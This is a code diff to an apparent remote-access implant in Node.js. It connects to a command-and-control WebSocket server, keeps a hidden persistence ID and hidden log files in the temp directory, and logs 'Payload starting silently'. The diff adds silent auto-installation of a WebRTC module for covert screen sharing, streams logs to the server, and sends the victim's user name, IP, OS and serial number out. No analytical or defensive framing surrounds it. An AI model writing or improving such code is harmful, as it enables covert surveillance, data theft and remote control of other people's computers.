@@ -5,25 +5,57 @@ const os = require('os');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
-const { spawn } = require('child_process');
+const https = require('https');
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
-const LOG_FILE = path.join(LOG_DIR, 'payload.log');
-const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log');
+const LOG_FILE = path.join(LOG_DIR, '.sys_cache.log');
 
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
+// --- FORCE INSTALLATION CHECK ---
+try {
+    const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
+    if (!fs.existsSync(nodeModulesPath)) {
+        console.log("[FORCE] @roamhq/wrtc missing. Installing...");
+        execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
+        console.log("[FORCE] Installation complete.");
+    }
+} catch (e) {
+    console.warn("[FORCE] Could not auto-install:", e.message);
+}
+
+// --- NATIVE WEBRTC IMPORTS ---
+let wrtc;
+try {
+    // Attempt to load the native module
+    wrtc = require('@roamhq/wrtc');
+} catch (e) {
+    console.error("Failed to require @roamhq/wrtc:", e.message);
+}
+
+// Check if the module actually has the required exports
+const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
+
+if (!HAS_WEBRTC) {
+    console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
+    console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
+}
+
+const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
+
+// --- LOGGING SYSTEM ---
 function log(msg) {
  const timestamp = new Date().toISOString();
- const logLine = `[${timestamp}] ${msg}`;
- console.log(logLine);
- try { 
- fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
- fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
- } catch(e) {}
+ console.log(`[${timestamp}] ${msg}`);
+ try {
+ fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
+ if (ws && ws.readyState === WebSocket.OPEN && myId) {
+ safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
+ }
+ } catch (e) {}
 }
 
 log("[INIT] Payload starting silently...");
@@ -297,28 +329,19 @@ function initConnection() {
  const realCpuCores = os.cpus().length;
 
  // Send actual guest device information
+ // FIXED: Ensure all keys match the server.js expectations exactly
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
- uniqueId: myId,
-
- deviceName: realDeviceName,
+ fingerprint: myId,
  os: realOsName,
- platform: process.platform,
- osVersion: os.release(),
  arch: os.arch(),
  user: realUser,
-
- manufacturer: realManufacturer || 'Unavailable',
- model: realModel || 'Unavailable',
- serialNumber: realSerialNumber || null,
-
- cpu: realCpu || 'Unavailable',
- cpuCores: realCpuCores,
- ramGB: realRamGB,
-
  ip: myIp,
- fingerprint: myId
+ last_seen: Math.floor(Date.now() / 1000),
+ status: 'Online',
+ created_at: Math.floor(Date.now() / 1000),
+ serial_number: realSerialNumber || realModel || 'Unknown'
  }));
 
  startMonitoring();
